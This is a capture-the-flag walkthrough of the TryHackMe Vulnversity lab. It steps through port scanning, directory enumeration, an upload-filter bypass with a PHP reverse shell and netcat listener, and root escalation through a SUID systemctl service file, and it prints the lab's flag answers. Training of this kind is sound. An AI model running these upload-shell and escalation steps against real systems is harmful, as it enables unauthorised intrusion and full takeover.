# TryHackMe Vulnversity Room Writeup

## Room Overview
Vulnversity is a beginner-friendly penetration testing room that covers essential reconnaissance, web application exploitation, and privilege escalation techniques. This room provides hands-on experience with directory enumeration, file upload vulnerabilities, and Linux privilege escalation.

**Difficulty:** Easy  
**Target OS:** Ubuntu Linux  
**Tools Used:** Nmap, GoBuster, BurpSuite, Netcat, PHP Reverse Shell

---

## Task 1: Deploy the Machine

### Objective
Deploy the vulnerable machine and connect to the TryHackMe network using OpenVPN.

### Steps
1. Click "Start Machine" to deploy the target
2. Connect to TryHackMe VPN using OpenVPN
3. Note the target IP address provided

---

## Task 2: Reconnaissance

### Objective
Perform active reconnaissance to identify open ports, services, and OS information.

### Nmap Scan
Execute a comprehensive Nmap scan to enumerate services:

```bash
nmap -sC -sV -p- <target-ip>
```

**Nmap Flags Explained:**
- `-sC`: Run default scripts for service enumeration
- `-sV`: Detect service versions
- `-p-`: Scan all 65535 ports

### Scan Results
The Nmap scan reveals the following open ports:

| Port | Service | Version |
|------|---------|----------|
| 21   | FTP     | vsftpd 3.0.3 |
| 22   | SSH     | OpenSSH 7.2p2 |
| 139  | NetBIOS | Samba smbd 3.X - 4.X |
| 445  | SMB     | Samba smbd 4.3.11 |
| 3128 | HTTP Proxy | Squid http proxy 3.5.12 |
| 3333 | HTTP    | Apache httpd 2.4.18 |

### Questions & Answers

**Q1: Scan the box, how many ports are open?**  
Answer: `6`

**Q2: What version of the squid proxy is running on the machine?**  
Answer: `3.5.12`

**Q3: How many ports will Nmap scan if the -p- flag is used?**  
Answer: `65535`

**Q4: What is this machine's IP address?**  
Answer: `<target-ip>`

**Q5: What port is the web server running on?**  
Answer: `3333`

---

## Task 3: Locating Directories Using GoBuster

### Objective
Use directory enumeration to discover hidden directories and files on the web server.

### Tool: GoBuster
GoBuster is a fast directory/file brute-forcing tool written in Go.

### Command
```bash
gobuster dir -u http://<target-ip>:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**GoBuster Flags:**
- `dir`: Directory/file brute-forcing mode
- `-u`: Target URL
- `-w`: Wordlist path

### Alternative: DirBuster
You can also use DirBuster (GUI-based tool) for directory enumeration.

### Discovered Directories

```
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/internal (Status: 301)
```

### Question & Answer

**Q: What is the directory that has an upload form page?**  
Answer: `/internal`

### Exploration
Navigate to `http://<target-ip>:3333/internal` to find an upload form.

---

## Task 4: Compromise the Webserver

### Objective
Exploit the file upload vulnerability to gain remote code execution.

### Step 1: Test File Upload Restrictions

The upload form at `/internal` allows file uploads. Test various file extensions to identify which are blocked:

**Test Extensions:**
- `.php` - **BLOCKED**
- `.php3` - **BLOCKED**
- `.php4` - **BLOCKED**
- `.php5` - **BLOCKED**
- `.phtml` - **ALLOWED** ✓

### Step 2: Use BurpSuite Intruder

For systematic testing, use BurpSuite Intruder:

1. Intercept the upload request with BurpSuite Proxy
2. Send the request to Intruder (Ctrl+I)
3. Set the filename extension as the payload position
4. Load a list of PHP extensions
5. Start the attack
6. Identify which extensions return "Success" responses

### Question & Answer

**Q: What common file type you'd want to upload to exploit the server is blocked?**  
Answer: `.php`

**Q: Run this attack, what extension is allowed?**  
Answer: `.phtml`

### Step 3: Prepare Reverse Shell

Download and modify the PHP reverse shell from PentestMonkey:

```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
mv php-reverse-shell.php shell.phtml
```

Edit the reverse shell configuration:

```php
$ip = 'YOUR-THM-VPN-IP';  // Your tun0 IP address
$port = 4444;              // Listening port
```

### Step 4: Set Up Netcat Listener

On your attacking machine, start a Netcat listener:

```bash
nc -lvnp 4444
```

**Netcat Flags:**
- `-l`: Listen mode
- `-v`: Verbose output
- `-n`: No DNS resolution
- `-p`: Port number

### Step 5: Upload and Execute Reverse Shell

1. Upload `shell.phtml` through the `/internal` upload form
2. Navigate to `http://<target-ip>:3333/internal/uploads/shell.phtml`
3. The reverse shell executes and connects back to your listener

### Question & Answer

**Q: What is the name of the user who manages the webserver?**  
Answer: `bill`

**Q: What is the user flag?**  
Navigate to the home directory and find the flag:

```bash
whoami
# Output: www-data

cd /home
ls
# Output: bill

cd bill
ls
cat user.txt
```

Answer: `8bd7992fbe8a6ad22a63361004cfcedb` 

---

## Task 5: Privilege Escalation

### Objective
Escalate from `www-data` to `root` user to capture the root flag.

### Step 1: Enumerate SUID Binaries

Search for SUID (Set User ID) binaries that run with elevated privileges:

```bash
find / -user root -perm /4000 2>/dev/null
```

**Command Breakdown:**
- `find /`: Search from root directory
- `-user root`: Files owned by root
- `-perm /4000`: Files with SUID bit set (octal 4000)
- `2>/dev/null`: Suppress error messages

### SUID Binary Results

```
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/ping6
/bin/su
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/sbin/mount.nfs
/bin/systemctl
```

### Question & Answer

**Q: On the system, search for all SUID files. What file stands out?**  
Answer: `/bin/systemctl`

### Step 2: Exploit systemctl SUID

The `systemctl` binary with SUID permissions is unusual and can be exploited.

### Exploitation Method

Reference GTFOBins for systemctl exploitation:

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

**Explanation:**
1. Create a temporary service file
2. Define a oneshot service that executes our command
3. The `ExecStart` command reads the root flag and copies it to `/tmp/output`
4. Link and enable the service using systemctl
5. The service runs with root privileges due to SUID

### Alternative Method: Direct Root Shell

For a root shell, modify the service:

```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
/bin/bash -p
```

This sets the SUID bit on `/bin/bash`, allowing privilege escalation:

```bash
/bin/bash -p
whoami
# Output: root
```

### Step 3: Capture Root Flag

With root access, read the root flag:

```bash
cat /root/root.txt
```

### Question & Answer

**Q: Become root and get the last flag (/root/root.txt)**  
Answer: `a58ff8579f0a9270368d33a9966c7fd5` 

---

## Tools & Techniques Summary

| Task | Tool | Command |
|------|------|----------|
| Port Scanning | Nmap | `nmap -sC -sV -p- <ip>` |
| Directory Enumeration | GoBuster | `gobuster dir -u <url> -w <wordlist>` |
| Web Traffic Interception | BurpSuite | Proxy + Intruder |
| Reverse Shell | PHP Reverse Shell | Modified with attacker IP/port |
| Listener | Netcat | `nc -lvnp 4444` |
| SUID Enumeration | find | `find / -user root -perm /4000` |
| Privilege Escalation | systemctl | SUID exploitation via service file |

---

## Conclusion

The Vulnversity room demonstrates a complete penetration testing workflow from reconnaissance to privilege escalation. Key learning points include:

1. **Active Reconnaissance:** Using Nmap to identify services and potential attack vectors
2. **Web Application Enumeration:** Directory brute-forcing to discover hidden functionality
3. **File Upload Bypass:** Testing various file extensions to circumvent upload restrictions
4. **Remote Code Execution:** Leveraging file upload vulnerabilities for initial access
5. **Linux Privilege Escalation:** Exploiting misconfigured SUID binaries for root access

**Room Status:** Completed ✓
